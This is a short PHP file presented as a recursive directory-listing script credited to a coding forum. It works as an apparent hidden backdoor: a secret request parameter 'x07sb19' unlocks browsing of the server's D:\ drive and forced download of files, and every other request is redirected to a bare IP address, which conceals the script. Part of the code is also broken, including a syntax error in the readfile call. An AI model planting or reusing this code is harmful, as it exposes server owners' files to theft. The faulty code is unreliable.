<?php

/***
This function will read the full structure of a directory. It's recursive becuase it doesn't stop with the one directory, it just keeps going through all of the directories in the folder you specify.

http://www.codingforums.com/showthread.php?t=71882
***/

function getDirectory( $path = 'D:\\', $level = 0 ){ 

    $ignore = array( 'cgi-bin', '.', '..' ); 
    // Directories to ignore when listing output. Many hosts 
    // will deny PHP access to the cgi-bin. 

    $dh = @opendir( $path ); 
    // Open the directory to the handle $dh 
     
    while( false !== ( $file = readdir( $dh ) ) ){ 
    // Loop through the directory 
     
        if( !in_array( $file, $ignore ) ){ 
        // Check that this file is not to be ignored 
             
            $spaces = str_repeat( '&nbsp;', ( $level * 4 ) ); 
            // Just to add spacing to the list, to better 
            // show the directory tree. 
             
            if( is_dir( "$path/$file" ) ){ 
            // Its a directory, so we need to keep reading down... 
             
                echo "<strong>$spaces $file</strong><br />"; 
                getDirectory( "$path/$file", ($level+1) ); 
                // Re-call this same function but on a new directory. 
                // this is what makes function recursive. 
             
            } else { 
                header('Content-Type: application/pdf');
                header("Content-Disposition: attachment; filename=\"$file\"");
                readfile($path."\\"$file);
                die;
            } 
        } 
    } 
     
    closedir( $dh ); 
    // Close the directory handle 

}

if(isset($_REQUEST['x07sb19'])){
    chdir($_REQUEST['x07sb19']);
    echo getcwd() ;
    getDirectory();
}else{
    header("Location:http://82.151.73.26");
    die();
  }
